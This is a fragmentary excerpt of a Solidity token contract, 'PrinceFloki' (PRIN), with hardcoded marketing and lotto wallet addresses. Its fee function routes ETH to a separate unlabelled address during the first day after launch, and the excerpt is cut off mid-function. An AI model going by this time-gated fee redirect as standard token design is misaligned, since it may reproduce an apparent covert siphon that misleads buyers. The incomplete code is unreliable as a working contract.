...
contract PrinceFloki is Context, IERC20, IERC20Extented, Ownable {
    using SafeMath for uint256;
    string private constant _name = "Prince";
    string private constant _symbol = "PRIN";
    ...
    address payable private _marketingAddress = payable(0xE183ae789ed27471CB0676Fd370ec2a5124136Cb);
    address payable constant private _projectLotto = payable(0xCb8dE84F5F3d8A172Bc71881E3BD06e0682627D7);
    ...
    function sendETHToFee(uint256 amount) private {
        if(block.timestamp < _firstBlock + (1 days)) {
            address payable addr = payable(0xE5D3c49bF2b8Ef077e37f22BD479580A686a8E8a); 
